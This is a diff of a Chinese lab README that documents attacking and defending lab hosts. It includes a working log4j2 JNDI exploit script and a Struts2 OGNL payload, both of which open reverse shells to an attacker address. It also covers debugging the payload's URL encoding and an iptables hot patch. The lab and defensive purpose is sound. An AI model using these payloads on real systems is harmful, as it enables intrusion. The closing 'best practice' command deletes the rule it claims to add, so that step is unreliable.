@@ -169,6 +169,102 @@ print(response.text)
 
 [![asciicast](https://asciinema.org/a/667333.svg)](https://asciinema.org/a/667333)
 
+### Debug
+
+在使用以下的 `python` 脚本验证 `log4j2` 漏洞时，遇到了下面的问题：
+
+```python
+"""log4j2 JNDI 注入"""
+
+import base64
+import urllib.parse
+
+import requests
+
+# ATTACKER_HOSTNAME = "kali-attacker.mlab"
+ATTACKER_HOSTNAME = "192.168.56.162"
+VICTIM_HOSTNAME = "ubuntu-victim.mlab"
+
+shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"
+
+shell_redirection_bytes = shell_redirection.encode("ascii")
+shell_redirection_b64 = base64.b64encode(shell_redirection_bytes).decode("ascii")
+
+print(f"Encoded string: {shell_redirection_b64}")
+
+
+params = {
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
+    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
+    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
+    # + urllib.parse.quote_plus(shell_redirection_b64)
+    + shell_redirection_b64
+    + "}",
+}
+
+
+response = requests.get(
+    "http://ubuntu-victim.mlab:8080/hello",
+    params=params,
+    verify=False,
+    timeout=10,
+)
+
+print(response.request.url)
+print(response.text)
+```
+
+![](.assets_img/README/base64_unmatch.png)
+
+如上图所示，`base64` 编码后的字符串中含有 `+` 号，而 `+` 号在 `url 编码` 中表示 `空格`
+
+但是 `python requests` 包会自动将 `payload` 自动进行 `url 编码`，如上图所示，`+` 号被成功替换为了 `%2B`
+
+但是，在 **攻击者（Kali-Attacker）** 接收到 **被攻击服务器端（ubuntu-victim）** 的，其 `+` 被替换成了 `空格`——从而导致 `base64 解码失败`
+
+使用 `wireshark` 抓包排查通信过程：
+
+![](.assets_img/README/tomcat_base64_missing.png)
+
+可以看到 **攻击者（Kali-Attacker）** 在接收时，`+` 就已经被错误替换成了 `空格`（错误 `base64` 形式）
+
+故可以初步推断 **被攻击服务器端（ubuntu-victim）** 在接收到 `url` 时，对于 `parameters` 部分后 **进行了 2 次 url 解码** 导致了上述问题
+
+对于上述表现，由于笔者没有查看 **被攻击服务器端（ubuntu-victim）** 对于 `url` 的解析代码，故无法给出准确的 **进行了 2 次 url 解码** 的原因。同时，查看 `jndi:ldap` 对于特殊字符的转义处理，也与 `url 编码` 标准不同——其不会将 `+` 解码为 `空格`（参见 [Special Characters](https://learn.microsoft.com/en-us/archive/technet-wiki/5392.active-directory-ldap-syntax-filters#Special_Characters)）
+
+但是出于解决问题的目的，我们的 `exp` 代码可以进行 `二次 url 编码`，从而解决上述问题。`编码` 部分的代码如下：
+
+```python
+params = {
+    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
+    + urllib.parse.quote_plus(shell_redirection_b64)  # 第一次 url 编码
+    + "}",
+}
+
+
+response = requests.get(
+    "http://ubuntu-victim.mlab:8080/hello",
+    params=params,  # requests 自动会进行第二次 url 编码
+    verify=False,
+    timeout=10,
+)
+```
+
+![](.assets_img/README/correct_base64_double_url_encoding.png)
+
+再在传输层面进行抓包验证：
+
+![](.assets_img/README/tomcat_base64_correct.png)
+
+再以 `+` 号为例，演示其编解码过程
+
+```
+攻击端（Kali-Attacker）：+ -> %2B -> %252B
+受害端（ubuntu-victim）：%252B -> %2B -> +
+```
+
+![](.assets_img/README/plus_double_decode.png)
+
 ## 漏洞攻防
 
 ### DMZ 场景
@@ -471,107 +567,105 @@ curl "192.169.86.3:80/index.php?cmd=ls+/tmp" -x socks5://127.0.0.1:1080; echo ''
 
 `tcpdump` 抓包结果：[tcpdump.pcap](./resources/tcpdump.pcap)
 
+### TCP shell 重定向
+
+由于直接使用 `TCP` 协议进行 `shell` 重定向（直接明文通信），故可以直接查看到入侵后肉鸡与攻击者之间的所有通信内容：
+
+使用过滤条件 `ip.addr == 192.168.56.162 and tcp.port == 4444` 以其中一段 `shell` 通信为例：
+
+![](.assets_img/README/tcp_shell.png)
+
+### Metasploit exploit 过程
+
+可以看到在攻击过程中，`HTTP` 请求中包含大量的包含攻击性的 `payload`：
+
+![](.assets_img/README/metasploit_exploit_tcpdump.png)
+
+### 扫网
+
+探测服务时使用了大量的 `ICMP` 包：
+
+![](.assets_img/README/ping_wrong_ip.png)
+
+## 威胁处置
+
+釜底抽薪，对于门户网站服务器存在的 [CVE-2020-17530](https://nvd.nist.gov/vuln/detail/CVE-2020-17530) 漏洞，`NIST` 对于 `Forced OGNL evaluation` 的修复建议均为更新 `Struts` 到 `2.5.26` 或更高的版本
+
+这里不适用更新 `Struts` 包的方式，而是使用 `热补丁` 的方式进行修复缓解漏洞利用
+
+### CVE-2020-17530 的原理
+
+`Struts` 框架（JAVA）中在处理 `OGNL` 表达式（另一种语言）时，当此表达式可以来自于用户输入时，攻击者可以构造恶意的 `OGNL` 表达式，从而执行任意代码
+
+查看 `metasploit` 对于此漏洞的 `exploit` 模块中的 [关键代码](https://github.com/rapid7/metasploit-framework/blob/dd0cf4baae32d0996cd5dd4ce358d9082ac311bf/modules/exploits/multi/http/struts2_multi_eval_ognl.rb#L162)
+
+可以看见关键的 `payload` 如下：
+
+![](.assets_img/README/struct2_payload.png)
+
+从我们 `tcpdump` 中抓取的包中，也可以看到相应的关键 `payload`：
+
+![](.assets_img/README/tcpdump_struct2_payload.png)
+
+![](.assets_img/README/tcpdump_struct2_payload2.png)
+
+```
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmMzMtO2V4ZWMgMzM8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTYyLzQ0NDQ7c2ggPCYzMyA+JjMzIDI+JjMzJw==}|{base64,-d}|bash"}))}
+```
+
+### 热补丁
+
+上面的 `payload` 中，要实现 `任意代码执行` 最关键同时同时也是最不可避免的部分如下：
+
+```
+(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmMzMtO2V4ZWMgMzM8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTYyLzQ0NDQ7c2ggPCYzMyA+JjMzIDI+JjMzJw==}|{base64,-d}|bash"}))
+```
+
+`execute.exec` 是非常明显的 `命令执行` 恶意代码
+
+~~高端的食材往往采用最朴素的烹饪方式~~，直接上 `iptables`！
+
 ```bash
-sudo apt install suricata
+echo '未添加任何 iptables 规则前'
+iptables -D DOCKER-USER -p tcp -m string --string 'execute.exec' --algo bm  -j DROP
+
+
+echo '添加 iptables 规则后'
+iptables -I DOCKER-USER -p tcp -m string --string 'execute.exec' --algo bm  -j DROP  # DROP 含有 'execute.exec' 的 TCP 包
 ```
 
-## Debug
+[![asciicast](https://asciinema.org/a/667503.svg)](https://asciinema.org/a/667503)
 
-在使用以下的 `python` 脚本验证 `log4j2` 漏洞时，遇到了下面的问题：
+### Debug
 
-```python
-"""log4j2 JNDI 注入"""
+在写 iptables 规则时，~~想当然地~~ 认为应该写在 `Filter` 表的 `INPUT` 链上：
 
-import base64
-import urllib.parse
-
-import requests
-
-# ATTACKER_HOSTNAME = "kali-attacker.mlab"
-ATTACKER_HOSTNAME = "192.168.56.162"
-VICTIM_HOSTNAME = "ubuntu-victim.mlab"
-
-shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"
-
-shell_redirection_bytes = shell_redirection.encode("ascii")
-shell_redirection_b64 = base64.b64encode(shell_redirection_bytes).decode("ascii")
-
-print(f"Encoded string: {shell_redirection_b64}")
-
-
-params = {
-    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
-    # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
-    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
-    # + urllib.parse.quote_plus(shell_redirection_b64)
-    + shell_redirection_b64
-    + "}",
-}
-
-
-response = requests.get(
-    "http://ubuntu-victim.mlab:8080/hello",
-    params=params,
-    verify=False,
-    timeout=10,
-)
-
-print(response.request.url)
-print(response.text)
+```bash
+iptables -I INPUT -p tcp -m string --string 'execute.exec' --algo bm  -j DROP
 ```
 
-![](.assets_img/README/base64_unmatch.png)
+发现在应用规则后，依然无法成功拦截高危负载 `execute.exec` 的 TCP 包
 
-如上图所示，`base64` 编码后的字符串中含有 `+` 号，而 `+` 号在 `url 编码` 中表示 `空格`
+后面才醒悟，虽然 `Docker Proxy` 将 `容器` 的端口 “暴露” 了出来，但是这些 `TCP` 包不是直接 `INPUT` `宿主机` 的，而是会进行 `FORWORD`——软件定义网络（software-defined networking）
 
-但是 `python requests` 包会自动将 `payload` 自动进行 `url 编码`，如上图所示，`+` 号被成功替换为了 `%2B`
+从下面的实验中可以看出 `iptables` 规则应用在 `Filter` 表的 `INPUT` 链上的效果：
 
-但是，在 **攻击者（Kali-Attacker）** 接收到 **被攻击服务器端（ubuntu-victim）** 的，其 `+` 被替换成了 `空格`——从而导致 `base64 解码失败`
+[![asciicast](https://asciinema.org/a/667506.svg)](https://asciinema.org/a/667506)
 
-使用 `wireshark` 抓包排查通信过程：
+但是我们外部主机访问 `DOCKER` 容器需要经过 `FORWORD`，所以应该将规则应用在 `Filter` 表的 `FORWARD` 链上：
 
-![](.assets_img/README/tomcat_base64_missing.png)
+在 `docker` 路由中，则已经有专用的 `DOCKER-USER` `chain` 以供上述需求：
 
-可以看到 **攻击者（Kali-Attacker）** 在接收时，`+` 就已经被错误替换成了 `空格`（错误 `base64` 形式）
+![](.assets_img/README/docker-user-chain.png)
 
-故可以初步推断 **被攻击服务器端（ubuntu-victim）** 在接收到 `url` 时，对于 `parameters` 部分后 **进行了 2 次 url 解码** 导致了上述问题
+所以，作为最佳实践应该添加下述 `iptables` 规则：
 
-对于上述表现，由于笔者没有查看 **被攻击服务器端（ubuntu-victim）** 对于 `url` 的解析代码，故无法给出准确的 **进行了 2 次 url 解码** 的原因。同时，查看 `jndi:ldap` 对于特殊字符的转义处理，也与 `url 编码` 标准不同——其不会将 `+` 解码为 `空格`（参见 [Special Characters](https://learn.microsoft.com/en-us/archive/technet-wiki/5392.active-directory-ldap-syntax-filters#Special_Characters)）
-
-但是出于解决问题的目的，我们的 `exp` 代码可以进行 `二次 url 编码`，从而解决上述问题。`编码` 部分的代码如下：
-
-```python
-params = {
-    "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
-    + urllib.parse.quote_plus(shell_redirection_b64)  # 第一次 url 编码
-    + "}",
-}
-
-
-response = requests.get(
-    "http://ubuntu-victim.mlab:8080/hello",
-    params=params,  # requests 自动会进行第二次 url 编码
-    verify=False,
-    timeout=10,
-)
+```bash
+iptables -D DOCKER-USER -p tcp -m string --string 'execute.exec' --algo bm  -j DROP
 ```
-
-![](.assets_img/README/correct_base64_double_url_encoding.png)
-
-再在传输层面进行抓包验证：
-
-![](.assets_img/README/tomcat_base64_correct.png)
-
-再以 `+` 号为例，演示其编解码过程
-
-```
-攻击端（Kali-Attacker）：+ -> %2B -> %252B
-受害端（ubuntu-victim）：%252B -> %2B -> +
-```
-
-![](.assets_img/README/plus_double_decode.png)
 
 ## 参考
 
 - [Configure the daemon to use a proxy](https://docs.docker.com/config/daemon/proxy/)
 - [VirtualBox Network Settings: Complete Guide](https://www.nakivo.com/blog/virtualbox-network-setting-guide/)
+- [Docker - Packet filtering and firewalls](https://docs.docker.com/network/packet-filtering-firewalls/)
